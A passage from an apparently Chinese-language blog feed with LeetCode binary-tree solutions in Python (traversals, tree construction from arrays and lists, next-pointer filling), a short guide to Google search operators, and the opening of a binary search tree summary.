helper(in_left,in_right,post_left,post_right): if in_left == in_right: return None # 构建当前“根” root = TreeNode(postorder[post_right-1]) # 从哈希表中找到当前“根”的索引 index = dicts[postorder[post_right-1]] # 更新中序遍历、后序遍历边界，然后递归构建左右子树 # 我们可以通过“中序和后序个数是相同”这个隐含条件，求出后序左右边界 root.left = helper(in_left,index,post_left,post_right-1-(in_right-index-1)) root.right = helper(index+1,in_right,post_right-1-(in_right-index-1),post_right-1) return root # 哈希表存储中序遍历的值、索引 dicts = &#123;var:i for i,var in enumerate(inorder)&#125; # 调用辅助函数 root = helper(0,len(inorder),0,len(postorder)) return root108-将有序数组转换为二叉搜索树题目描述将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。本题中，一个高度平衡二叉树是指一个二叉树每个节点的左右两个子树的高度差的绝对值不超过 1。示例:给定有序数组: [-10,-3,0,5,9]，一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：12345 0 / \ -3 9 / /-10 5思路二叉搜索树的中序遍历刚好可以输出一个升序数组，所以题目给出的升序数组就是二叉搜索树的中序遍历。根据中序遍历还原一颗树，又想到了 105 题 和 106 题，通过中序遍历加前序遍历或者中序遍历加后序遍历来还原一棵树。前序（后序）遍历的作用呢？提供根节点！然后根据根节点，就可以递归的生成左右子树。这里的话怎么知道根节点呢？平衡二叉树，既然要做到平衡，我们只要把根节点选为数组的中点即可。Python实现123456789101112131415class Solution: def sortedArrayToBST(self, nums: List[int]) -&gt; TreeNode: return self.binarySearch(nums,0,len(nums)-1) def binarySearch(self, nums, left, right): if left &gt; right: return None mid = left + (right-left) // 2 root = TreeNode(nums[mid]) # 递归构建左右子树 root.left = self.binarySearch(nums, left, mid-1) root.right = self.binarySearch(nums, mid+1, right) return root109-有序链表转换二叉搜索树题目描述给定一个单链表，其中的元素按升序排序，将其转换为高度平衡的二叉搜索树。本题中，一个高度平衡二叉树是指一个二叉树每个节点的左右两个子树的高度差的绝对值不超过 1。示例:给定的有序链表：[-10, -3, 0, 5, 9]，一个可能的答案是：[0, -3, 9, -10, null, 5], 它可以表示下面这个高度平衡二叉搜索树：12345 0 / \ -3 9 / /-10 5思路这道题目跟108题是类似的，数组可以很方便的找到中点，但链表的特性导致我们无法像数组那样通过下标访问各个元素。若想按照108题的做法，就需要设置两个指针slow、fast，slow每走一步fast走两步，这样fast结束时slow就在中点。但这样会导致每次递归都需要重复遍历链表，效率较低。注意：当找到链表中的中间元素后，我们将链表从中间元素的左侧断开，做法是slow指针初始指向dummy，最后slow.next才是中点，然后我们在中点的左侧断开，也就是slow.next = None。Python实现——二分1234567891011121314151617181920212223242526272829303132class Solution: def sortedListToBST(self, head: ListNode) -&gt; TreeNode: if head == None: return None # 链表寻找中点 # 为了保证保留左子树的右边界，这里设置slow=dummy而不是head dummy = ListNode(None) dummy.next = head slow = dummy fast = head while fast.next != None and fast.next.next != None: slow = slow.next fast = fast.next.next # 由于slow初始值为dummy，因此slow.next才为中点 root = TreeNode(slow.next.val) # 链表从中间断开（左子树的右边界是中点的左边一个节点，右子树的左边界是中点的右边一个节点） mid = slow.next.next slow.next = None # 递归构建左右子树 # 判断左子树是否为空 if slow == dummy: root.left = None else: root.left = self.sortedListToBST(dummy.next) root.right = self.sortedListToBST(mid) return rootPython实现——链表转换数组+二分在这个方法中，我们将给定的链表转成数组并利用数组来构建二叉搜索树。数组找中间元素只需要 O(1) 的时间，所以会降低整个算法的时间复杂度开销。1234567891011121314151617181920212223class Solution: def sortedListToBST(self, head: ListNode) -&gt; TreeNode: # 链表转换成数组 nums = [] while head: nums.append(head.val) head = head.next return self.binarySearch(nums,0,len(nums)-1) # 辅助函数 def binarySearch(self, nums, left, right): if left &gt; right: return None mid = left + (right - left) // 2 root = TreeNode(nums[mid]) # 递归构建左右子树 root.left = self.binarySearch(nums,left,mid-1) root.right = self.binarySearch(nums,mid+1,right) return root二叉搜索树相关题目二叉查找树既是一颗树，又带有特别的有序性质，所以考察的方式比较多而且灵活，属于面试题目中的常客。此部分详细题解见：LeetCode 题目总结 - 二叉搜索树参考LeetCode 前1000题二叉树题目系统总结（吐血推荐！）LeetCode二叉树(Tree)小结LeetCode 总结 - 搞定 Binary Tree 面试题LeetCode总结 – 树]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google搜索技巧]]></title>
    <url>%2Farchives%2Fb1453574.html</url>
    <content type="text"><![CDATA[我们在日常生活中利用Google搜索的一些技巧可以更加高效的找到我们需要的信息。基本语法AND谷歌的默认搜索是and逻辑，我们在输入关键字后进行搜索时，如输入：program google后，会搜出包含program和google的文件内容。OR如果你想搜索两个中的任意一个，那么就要使用关键词OR。注意：OR是大写的，小写是不起作用的，而且，每一个关键词与OR之间是有一个空格的。短语搜索如果你希望搜索“program google”的内容，而不希望这两个单词之间有任何其他的内容，那么就要使用双引号把搜索的内容组成一个词组来达到目的。“-”如果我们只想看到program的内容，而不希望看到google的内容，就可以把-（减号或者破折号）应用到搜索当中去，语法为program -google。注意：-之前是有一个空格的，而其后却是和下一个关键词是紧紧相连的！可以看得到结果中都会包含program，而不包含google。高级语法intitle这个语法的作用是将搜索的范围局限在标题上。在关键词前面加上这个，就会只对网页的标题进行搜索并且配对，最后将结果返回给用户。1intitle:小丁intext这个语法是用来搜索网页正文内容的，这样就可以忽略网页中的超文本链接、URL和题目。1intext:小丁inanchor这个语法的意思是在页面的链接锚点进行搜索。链接锚点指的是一个链接的描述文本，如这样的一段HTML代码：&lt;a href=https://www.baidu.com&gt;百度&lt;/a&gt;，链接的锚点就是“百度”了。site这个语法是把搜索限制在站点域名之内。例如我们搜索program site:google.com，这里呢，我们通常不需要加上前面的www，这样搜索的结果就会是包括所有含有google.com域名的有关内容，包括顶级域名和二级域名甚至三级域名的内容。inurl这个语法会将搜索的范围限制在URL或者网站的页面上。1inurl:passwordcache这个语法可以帮助我们查找到google索引过的页面副本，即使源文件界面不存在了，或者变成了其它的内容，我们依然可以搜索的到。1cache：www.baidu.comfiletype这个语法可以搜索指定后缀的文件。1filetype:pdf特定时间为了将查询结果限制在一个特定的时间段内，可以采用以下语法：123avengers endgame before:2019avengers endgame after:2019-04-01avengers endgame after:2019-03-01 before:2019-03-05数学运算当我们需要简单数学运算时，无需费力的点开计算机，只需要直接在Google中输入数学算式即可，算式可以包含+、-、*、/和括号这些基本的算术功能。例如：(4*8)/2+18-1单位换算方便的单位换算，只需要输入你想要换算的两种单位即可，例如：100磅=?公斤参考谷歌搜索语法（一）基本语法谷歌搜索语法（二）高级语法]]></content>
      <categories>
        <category>工具使用</category>
        <category>搜索引擎</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题目总结-二叉树的遍历]]></title>
    <url>%2Farchives%2Fe1014f63.html</url>
    <content type="text"><![CDATA[遍历的含义就是把树的所有节点（Node）按照某种顺序访问一遍。包括前序，中序，后序，层序4种遍历方法。以图的深度优先搜索为原型的遍历144-二叉树的前序遍历94-二叉树的中序遍历145-二叉树的后序遍历在这种类型中，递归的实现方式是非常简单的，只需要递归左右结点，直到结点为空作为结束条件就可以，哪种序就取决于你访问结点的时间。不过一般这不能满足面试官的要求，可能会接着问能不能用非递归实现一下，这个说起来比较简单，其实就是用一个栈手动模拟递归的过程。有时候非递归还是不能满足面试官，还会问一问，上面的做法时间和空间复杂度是多少。我们知道，正常遍历时间复杂度是O(n)，而空间复杂度是则是递归栈（或者自己维护的栈）的大小，也就是O(logn)。他会问能不能够在常量空间内解决树的遍历问题呢？确实还真可以，这里就要介绍一下Morris遍历。Morris遍历方法用了线索二叉树，这个方法不需要为每个节点额外分配指针指向其前驱和后继结点，而是利用叶子节点中的右空指针指向中序遍历下的后继节点就可以了。这样就节省了需要用栈来记录前驱或者后继结点的额外空间，所以可以达到O(1)的空间复杂度。不过这种方法有一个问题就是会暂时性的改动树的结构，这在程序设计中并不是很好的习惯，这些在面试中都可以和面试官讨论，一般来说问到这里不会需要进行Morris遍历方法的代码实现了，只需要知道这种方法和他的主要优劣势就可以了。以图的广度优先搜索为原型的遍历，在树中称为层序遍历，LeetCode中有三种：自顶向下层序、自底向上层序、锯齿层序遍历。102-二叉树的层次遍历103-二叉树的锯齿形层次遍历107-二叉树的层次遍历ii自顶向下层序遍历其实比较简单，代码基本就是图的广度优先搜索，思路就是维护一个队列存储上一层的结点，逐层访问。而自底向上层序层序遍历则要从最后一层倒序访问上来，这个我没有想到太好的方法，现在的实现就是把自顶向下层序遍历得到的层放入数据结构然后reverse过来。至于锯齿层序遍历因为每一层访问顺序有所改变，而且是每次都反转顺序，这让我们想到栈这个数据结构，所以这里不用队列而改用栈来保存，就可以满足每层反转访问顺序的要求了。层次遍历相关的题目：116-填充每个节点的下一个右侧节点指针117-填充每个节点的下一个右侧节点指针ii513-找树左下角的值515-在每个树行中找最大值以图的深度优先搜索为原型的遍历144-二叉树的前序遍历题目描述给定一个二叉树，返回它的 前序 遍历。示例:12345678输入: [1,null,2,3] 1 \ 2 / 3 输出: [1,2,3]进阶: 递归算法很简单，你可以通过迭代算法完成吗？思路前序遍历算法先访问树的根节点，然后以类似的方式分别遍历左子树和右子树。方法1——递归定义函数preorderTraversal(self, node)返回以node为答案的先序遍历结果的数组，假设它的两个孩子node.left和node.right已经搞定了，即可以返回答案的输出数组。那么思考最终的输出数组是什么样的，很明显要满足根 ➜ 左 ➜ 右的规则，应该返回[node.val] + preorderTraversal(self, node.left) + preorderTraversal(self, node.right)（函数返回的就是一个数组，只需要把它们拼接起来即可）。123456789101112class Solution: def preorderTraversal(self, root: TreeNode) -&gt; List[int]: if root == None: return [] output = [] output.append(root.val) output += self.preorderTraversal(root.left) output += self.preorderTraversal(root.right) return output方法2——迭代递归算法使用系统栈，不好控制，性能问题比较严重，需要进一步了解不用递归如何实现。为了维护固定的访问顺序，使用栈数据结构的先入后出特性。先处理根节点，根据访问顺序根 ➜ 左 ➜ 右，先入栈的后访问，为了保持访问顺序（先入后出），先把右孩子入栈，再入栈左孩子（此处需要注意，出栈才是访问顺序）。12345678910111213141516171819class Solution: def preorderTraversal(self, root: TreeNode) -&gt; List[int]: if root == None: return [] stack = [root] output = [] while stack: root = stack.pop() if root != None: # 先入栈右节点 stack.append(root.right) # 后入栈左节点 stack.append(root.left) # 栈顶元素并入输出 output.append(root.val) return output注意：我这里是把所有迭代过程中的root节点的right节点、left节点（包括空节点）均放入栈，然后在循环里面弹出栈顶元素，检查是否是空，如果为空节点，则不操作。时间复杂度：访问每个节点恰好一次，时间复杂度为 O(N) ，其中 N 是节点的个数，也就是树的大小。空间复杂度：取决于树的结构，最坏情况存储整棵树，因此空间复杂度是 O(N)。方法3——颜色标记法其核心思想是使用颜色标记节点的状态，新节点为白色，已访问的节点为灰色：如果遇到的节点为白色，则将其标记为灰色，然后将其右子节点、左子节点、自身依次入栈。如果遇到的节点为灰色，则将节点的值输出。颜色标记法的优势：兼具栈迭代方法的高效，又像递归方法一样简洁易懂，更重要的是，这种方法对于前序、中序、后序遍历，能够写出完全一致的代码。1234567891011121314151617181920class Solution: def preorderTraversal(self, root: TreeNode) -&gt; List[int]: if root == None: return [] WHITE,GRAY = 0,1 stack = [(WHITE,root)] output = [] while stack: color,root = stack.pop() if root != None: if color == WHITE: stack.append((WHITE,root.right)) stack.append((WHITE,root.left)) stack.append((GRAY,root)) else: output.append(root.val) return output94-二叉树的中序遍历题目描述给定一个二叉树，返回它的 中序 遍历。示例:12345678输入: [1,null,2,3] 1 \ 2 / 3输出: [1,3,2]进阶: 递归算法很简单，你可以通过迭代算法完成吗？思路中序遍历的算法先遍历左子树，然后访问根节点，最后遍历右子树，这个算法先尽量移动到树的最左边，然后才开始访问节点。方法1——递归同理于前序遍历，一模一样的处理方法，考虑访问顺序为左 ➜ 根 ➜ 右即可，快速模仿并写出代码。123456789101112class Solution(object): def inorderTraversal(self, root): if root == None: return [] output = [] output += self.inorderTraversal(root.left) output.append(root.val) output += self.inorderTraversal(root.right) return output方法2——迭代核心思路依旧是利用栈维护节点的访问顺序：左 ➜ 根 ➜ 右。使用一个p_node来指向当前访问节点，p是代表指针point，另外有一个变量cur_node表示当前正在操作节点（把出栈节点值加入输出数组中），算法步骤如下（可以对照代码注释）:访问当前节点，如果当前节点有左孩子，则把它的左孩子都入栈，移动当前节点到左孩子，重复第一步直到当前节点没有左孩子当当前节点没有左孩子时，栈顶节点出栈，加入结果数组当前节点指向栈顶节点的右节点1234567891011121314151617181920212223242526class Solution(object): def inorderTraversal(self, root): if root == None: return [] stack = [] output = [] # 当前访问节点指针 p_node = root while stack or p_node: # 把所有当前访问节点的左孩子都入栈 while p_node: stack.append(p_node) p_node = p_node.left # 操作栈顶节点，如果是第一次运行到这步，那么这是整棵树的最左节点 cur_node = stack.pop() # 因为已经保证没有左节点，可以访问根节点 output.append(cur_node.val) if cur_node.right: # 将指针指向当前节点的右节点 p_node = cur_node.right return output方法3——颜色标记法其核心思想是使用颜色标记节点的状态，新节点为白色，已访问的节点为灰色：如果遇到的节点为白色，则将其标记为灰色，然后将其右子节点、自身、左子节点依次入栈。如果遇到的节点为灰色，则将节点的值输出。123456789101112131415161718192021class Solution(object): def inorderTraversal(self, root): if root == None: return [] WHITE,GRAY = 0,1 stack = [(WHITE,root)] output = [] while stack: color,root = stack.pop() if root != None: if color == WHITE: stack.append((WHITE,root.right)) stack.append((GRAY,root)) stack.append((WHITE,root.left)) else: output.append(root.val) return output145-二叉树的后序遍历题目描述给定一个二叉树，返回它的 后序 遍历。示例:12345678输入: [1,null,2,3] 1 \ 2 / 3 输出: [3,2,1]进阶: 递归算法很简单，你可以通过迭代算法完成吗？思路后序遍历算法会先遍历左子树，然后是右子树，最后访问根节点。方法1——递归类似前序遍历，只需要改变节点访问顺序。123456789101112class Solution(object): def postorderTraversal(self,root): if root == None: return [] output = [] output += self.postorderTraversal(root.left) output += self.postorderTraversal(root.right) output.append(root.val) return output方法2——迭代我们发现后序遍历的顺序是左 ➜ 右 ➜ 根，那么反序的话，就直接倒序的输出结果，即反后序：根 ➜ 右 ➜ 左，和先序遍历的根 ➜ 左 ➜ 右对比，发现只需要稍微改一下代码就可以得到反后序的结果，参考先序遍历，代码如下：12345678910111213141516class Solution(object): def postorderTraversal(self,root): if root == None: return [] stack = [root] output = [] while stack: root = stack.pop() if root != None: output.append(root.val) stack.append(root.left) stack.append(root.right) return output[::-1]方法3——迭代（颜色标记法）后序遍历访问顺序要求为左 ➜ 右 ➜ 根，在对访问节点进行操作的条件是，它的左子树和右子树都已经被访问。这样算法的框架就出来了：只需要对每个节点进行标记，表示这个节点有没有被访问，一个节点能否进行操作的条件就是这个节点的左右节点都被访问过了。因为栈先入后出，为了维护访问顺序满足条件，入栈顺序应该是根 ➜ 右 ➜ 左（和要求访问顺序相反）。代码如下：123456789101112131415161718192021class Solution(object): def postorderTraversal(self,root): if root == None: return [] WHITE,GRAY = 0,1 stack = [(WHITE,root)] output = [] while stack: color,root = stack.pop() if root != None: if color == WHITE: stack.append((GRAY,root)) stack.append((WHITE,root.right)) stack.append((WHITE,root.left)) else: output.append(root.val) return output以图的广度优先搜索为原型的遍历102-二叉树的层次遍历题目描述给定一个二叉树，返回其按层次遍历的节点值。（即逐层地，从左到右访问所有节点）。例如：给定二叉树: [3,9,20,null,null,15,7],12345 3 / \9 20 / \ 15 7返回其层次遍历结果：12345[ [3], [9,20], [15,7]]思路方法1——借助队列的迭代方法我们将树上顶点按照层次依次放入队列结构中，队列中元素满足 FIFO（先进先出）的原则。在 Python 中如果使用 Queue 结构，但因为它是为多线程之间安全交换而设计的，所以使用了锁，会导致性能不佳。因此在 Python 中可以使用 deque 的 append() 和 popleft() 函数来快速实现队列的功能。注意：输出要求List[List[int]]。算法步骤：计算当前层级节点数目，然后从队列中循环取出当前层级的全部节点（节点放入到列表中），并且将其左右子节点放入队列。循环上步直到队列为空123456789101112131415161718192021222324252627from collections import dequeclass Solution: def levelOrder(self, root: TreeNode) -&gt; List[List[int]]: if root == None: return [] queue = deque([root,]) output = [] while queue: # 当前层级节点数目 level_length = len(queue) temp = [] for _ in range(level_length): node = queue.popleft() temp.append(node.val) if node.left != None: queue.append(node.left) if node.right != None: queue.append(node.right) output.append(temp) return output方法2——递归1234567891011121314151617181920class Solution: def levelOrder(self, root: TreeNode) -&gt; List[List[int]]: # 辅助函数（添加变量res，depth） def helper(root, res, depth): if root == None: return [] # 比较访问节点所在的层次 depth 和当前最高层次 len(res) 的大小，如果前者更大就向 res 添加一个空列表 if len(res) == depth: res.append([]) # 当前节点插入到对应层的列表 res[depth] 中 res[depth].append(root.val) # 递归 helper(root.left,res,depth+1) helper(root.right,res,depth+1) res = [] helper(root,res,0) return res时间复杂度：O(N)，因为每个节点恰好会被运算一次。空间复杂度：O(N)，保存输出结果的数组包含 N 个节点的值。103-二叉树的锯齿形层次遍历题目描述给定一个二叉树，返回其节点值的锯齿形层次遍历。（即先从左往右，再从右往左进行下一层遍历，以此类推，层与层之间交替进行）。例如：给定二叉树 [3,9,20,null,null,15,7],12345 3 / \9 20 / \ 15 7返回锯齿形层次遍历如下：12345[ [3], [20,9], [15,7]]思路方法1——借助队列的迭代方法与102题相同，这道题的本质是树的层次遍历（广度优先遍历）。只需要把偶数层的结果进行反转即可。12345678910111213141516171819202122232425262728293031323334353637from collections import dequeclass Solution: def zigzagLevelOrder(self, root: TreeNode) -&gt; List[List[int]]: if root == None: return [] queue = deque([root]) output = [] # 标记是否需要翻转结果 signal = True while queue: # 队列的长度（这层的节点数） length = len(queue) temp = [] for _ in range(length): node = queue.popleft() if node.left != None: queue.append(node.left) if node.right != None: queue.append(node.right) temp.append(node.val) # 根据标记决定是否翻转结果 if signal == False: temp = temp[::-1] signal = True else: signal = False output.append(temp) return output107-二叉树的层次遍历ii题目描述给定一个二叉树，返回其节点值自底向上的层次遍历。（即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）例如：给定二叉树 [3,9,20,null,null,15,7],12345 3 / \9 20 / \ 15 7返回其自底向上的层次遍历为：12345[ [15,7], [9,20], [3]]思路方法1——层次遍历迭代（反转结果）我这里用层次遍历得到节点列表，然后将这个节点列表进行反转即可：1output = output[::-1]整体代码：1234567891011121314151617181920212223242526from collections import dequeclass Solution: def levelOrderBottom(self, root: TreeNode) -&gt; List[List[int]]: if root == None: return [] queue = deque([root]) output = [] while queue: # 当前层级节点数目 length = len(queue) temp = [] for _ in range(length): node = queue.popleft() temp.append(node.val) if node.left != None: queue.append(node.left) if node.right != None: queue.append(node.right) output.append(temp) return output[::-1]方法2——层次遍历迭代（从头添加数组）当然，我们也可以每次从头添加数组：1output.insert(0,temp)整体代码：1234567891011121314151617181920212223242526from collections import dequeclass Solution: def levelOrderBottom(self, root: TreeNode) -&gt; List[List[int]]: if root == None: return [] queue = deque([root]) output = [] while queue: # 当前层级节点数目 length = len(queue) temp = [] for _ in range(length): node = queue.popleft() temp.append(node.val) if node.left != None: queue.append(node.left) if node.right != None: queue.append(node.right) output.insert(0,temp) return output116-填充每个节点的下一个右侧节点指针题目描述给定一个完美二叉树，其所有叶子节点都在同一层，每个父节点都有两个子节点。二叉树定义如下：123456struct Node &#123; int val; Node *left; Node *right; Node *next;&#125;填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。示例：输入：{&quot;$id&quot;:&quot;1&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;2&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;3&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:4},&quot;next&quot;:null,&quot;right&quot;:{&quot;$id&quot;:&quot;4&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:5},&quot;val&quot;:2},&quot;next&quot;:null,&quot;right&quot;:{&quot;$id&quot;:&quot;5&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;6&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:6},&quot;next&quot;:null,&quot;right&quot;:{&quot;$id&quot;:&quot;7&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:7},&quot;val&quot;:3},&quot;val&quot;:1}输出：{&quot;$id&quot;:&quot;1&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;2&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;3&quot;,&quot;left&quot;:null,&quot;next&quot;:{&quot;$id&quot;:&quot;4&quot;,&quot;left&quot;:null,&quot;next&quot;:{&quot;$id&quot;:&quot;5&quot;,&quot;left&quot;:null,&quot;next&quot;:{&quot;$id&quot;:&quot;6&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:7},&quot;right&quot;:null,&quot;val&quot;:6},&quot;right&quot;:null,&quot;val&quot;:5},&quot;right&quot;:null,&quot;val&quot;:4},&quot;next&quot;:{&quot;$id&quot;:&quot;7&quot;,&quot;left&quot;:{&quot;$ref&quot;:&quot;5&quot;},&quot;next&quot;:null,&quot;right&quot;:{&quot;$ref&quot;:&quot;6&quot;},&quot;val&quot;:3},&quot;right&quot;:{&quot;$ref&quot;:&quot;4&quot;},&quot;val&quot;:2},&quot;next&quot;:null,&quot;right&quot;:{&quot;$ref&quot;:&quot;7&quot;},&quot;val&quot;:1}解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。提示：你只能使用常量级额外空间。使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。思路方法1——层次遍历-迭代首先想到层次遍历入队，各层中的点都逐一连接。1234567891011121314151617181920212223242526272829303132333435363738"""# Definition for a Node.class Node: def __init__(self, val, left, right, next): self.val = val self.left = left self.right = right self.next = next"""class Solution: def connect(self, root: 'Node') -&gt; 'Node': if root == None: return None queue = [root] while queue: length = len(queue) # 先弹出一个节点，便于循环中填充next指针 pre = queue.pop(0) # 左右子树入队 if pre.left != None: queue.append(pre.left) if pre.right != None: queue.append(pre.right) for _ in range(length-1): cur = queue.pop(0) pre.next = cur # 左右子树入队 if cur.left != None: queue.append(cur.left) if cur.right != None: queue.append(cur.right) # 更新pre指针 pre = cur return root方法2——常数空间复杂度之前是用队列将下一层的节点保存了起来。这里的话，其实只需要提前把下一层的next构造完成，到了下一层的时候就可以遍历了。我们可以通过判断当前遍历的节点是不是null来决定是否进入下一层。然后，我们需要一个额外的变量存储每一层的开头节点。下面是一个图解： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647"""# Definition for a Node.class Node: def __init__(self, val, left, right, next): self.val = val self.left = left self.right = right self.next = next"""class Solution: def connect(self, root: 'Node') -&gt; 'Node': if root == None: return None start = root pre = root cur = root.next while start.left != None: # 构造下一层的next指针 pre.left.next = pre.right while cur != None: pre.right.next = cur.left cur.left.next = cur.right # 更新pre、cur pre = cur cur = cur.next # 更新pre、cur、start pre = start.left cur = start.right start = pre return root``` ### 117-填充每个节点的下一个右侧节点指针ii#### 题目描述给定一个二叉树```c++struct Node &#123; int val; Node *left; Node *right; Node *next;&#125;填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。初始状态下，所有 next 指针都被设置为 NULL。示例：输入：{&quot;$id&quot;:&quot;1&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;2&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;3&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:4},&quot;next&quot;:null,&quot;right&quot;:{&quot;$id&quot;:&quot;4&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:5},&quot;val&quot;:2},&quot;next&quot;:null,&quot;right&quot;:{&quot;$id&quot;:&quot;5&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:{&quot;$id&quot;:&quot;6&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:7},&quot;val&quot;:3},&quot;val&quot;:1}输出：{&quot;$id&quot;:&quot;1&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;2&quot;,&quot;left&quot;:{&quot;$id&quot;:&quot;3&quot;,&quot;left&quot;:null,&quot;next&quot;:{&quot;$id&quot;:&quot;4&quot;,&quot;left&quot;:null,&quot;next&quot;:{&quot;$id&quot;:&quot;5&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:null,&quot;val&quot;:7},&quot;right&quot;:null,&quot;val&quot;:5},&quot;right&quot;:null,&quot;val&quot;:4},&quot;next&quot;:{&quot;$id&quot;:&quot;6&quot;,&quot;left&quot;:null,&quot;next&quot;:null,&quot;right&quot;:{&quot;$ref&quot;:&quot;5&quot;},&quot;val&quot;:3},&quot;right&quot;:{&quot;$ref&quot;:&quot;4&quot;},&quot;val&quot;:2},&quot;next&quot;:null,&quot;right&quot;:{&quot;$ref&quot;:&quot;6&quot;},&quot;val&quot;:1}解释：给定二叉树如图 A 所示，你的函数应该填充它的每个 next 指针，以指向其下一个右侧节点，如图 B 所示。提示：你只能使用常量级额外空间。使用递归解题也符合要求，本题中递归程序占用的栈空间不算做额外的空间复杂度。思路方法1——层次遍历123456789101112131415161718192021222324252627282930313233343536373839"""# Definition for a Node.class Node: def __init__(self, val, left, right, next): self.val = val self.left = left self.right = right self.next = next"""class Solution: def connect(self, root: 'Node') -&gt; 'Node': if root == None: return None queue = [root] while queue: length = len(queue) # 先弹出一个节点，便于循环中填充next指针 pre = queue.pop(0) # 左右子树入队 if pre.left != None: queue.append(pre.left) if pre.right != None: queue.append(pre.right) for _ in range(length-1): cur = queue.pop(0) pre.next = cur # 左右子树入队 if cur.left != None: queue.append(cur.left) if cur.right != None: queue.append(cur.right) pre = cur return root方法2——常数空间解法我们用一个dummy指针，当连接第一个节点的时候，就将dummy指针指向他。cur 指针利用 next 不停的遍历当前层。如果 cur 的孩子不为 null 就将它接到 tail 后边，然后更新tail。当 cur 为 null 的时候，再利用 dummy 指针得到新的一层的开始节点。下面是一个示意图：123456789101112131415161718192021222324252627282930313233"""# Definition for a Node.class Node: def __init__(self, val, left, right, next): self.val = val self.left = left self.right = right self.next = next"""class Solution: def connect(self, root: 'Node') -&gt; 'Node': cur = root while cur != None: dummy = Node() tail = dummy # 遍历cur所在的当前层 while cur != None: if cur.left != None: tail.next = cur.left tail = tail.next if cur.right != None: tail.next = cur.right tail = tail.next cur = cur.next # 更新cur到下一层 cur = dummy.next return root参考【直观算法】二叉树遍历算法总结LeetCode总结 – 树]]></content>
      <categories>
        <category>计算机基础</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode题目总结-二叉搜索树]]></title>
    <url>%2Farchives%2F5f8aadd1.html</url>
    <content type="text"><![CDATA[我们发现：在链表中，插入、删除速度很快O(1)，但查找速度较慢O(n)。在数组中，查找速度很快O(1)，但插入、删除速度很慢O(n)。为了解决这个问题，我们需要寻找一种能够在插入、删除、查找、遍历等操作都相对快的容器，于是人们发明了二叉搜索树（二叉树仅作为二叉搜索树的基础）。二叉搜索树的插入、删除、查找成本均为O(log n)二叉搜索树的性质如果节点的左子树不空，则左子树上所有结点的值均小于等于它的根结点的值；如果节点的右子树不空，则右子树上所有结点的值均大于等于它的根结点的值；任意节点的左、右子树也分别为二叉搜索树；二叉搜索树的查找、插入、删除过程查找通过二叉搜索树查找节点，理想情况下我们需要检查的节点数可以减半。但是二叉搜索树十分依赖于树中节点的拓扑结构，也就是节点间的布局关系。下图描绘了一个节点插入顺序为 20, 50, 90, 150, 175, 200 的二叉搜索树。这些节点是按照递升顺序被插入的，结果就是这棵树没有广度（Breadth）可言。也就是说，它的拓扑结构其实就是将节点排布在一条线上，而不是以扇形结构散开，所以查找时间也为 O(n)。下面是一个查找过程：插入当向树中插入一个新的节点时，该节点将总是作为叶子节点。所以，最困难的地方就是如何找到该节点的父节点。下面是一个插入过程：删除删除节点算法的第一步是定位要被删除的节点，这可以使用前面介绍的查找算法，因此运行时间为 O(logn)。接着应该选择合适的节点来代替删除节点的位置，它共有三种情况需要考虑。情况 1：如果被删除的节点没有右孩子，那么就选择它的左孩子来代替原来的节点。二叉搜索树的性质保证了被删除节点的左子树必然符合二叉搜索树的性质。因此左子树的值要么都大于，要么都小于被删除节点的父节点的值，这取决于被删除节点是左孩子还是右孩子。因此用被删除节点的左子树来替代被删除节点，是完全符合二叉搜索树的性质的。情况 2：如果被删除节点的右孩子没有左孩子，那么这个右孩子被用来替换被删除节点。因为被删除节点的右孩子都大于被删除节点左子树的所有节点，同时也大于或小于被删除节点的父节点，这同样取决于被删除节点是左孩子还是右孩子。因此，用右孩子来替换被删除节点，符合二叉搜索树的性质。情况 3：如果被删除节点的右孩子有左孩子，就需要用被删除节点右孩子的左子树中的最下面的节点来替换它，就是说，我们用被删除节点的右子树中最小值的节点来替换。LeetCode相关题目基本操作235-二叉搜索树的最近公共祖先450-删除二叉搜索树中的节点669-修剪二叉搜索树700-二叉搜索树中的搜索701-二叉搜索树中的插入操作基于中序遍历98-验证二叉搜索树99-恢复二叉搜索树230-二叉搜索树中第K小的元素501-二叉搜索树中的众数235-二叉搜索树的最近公共祖先题目描述给定一个二叉搜索树, 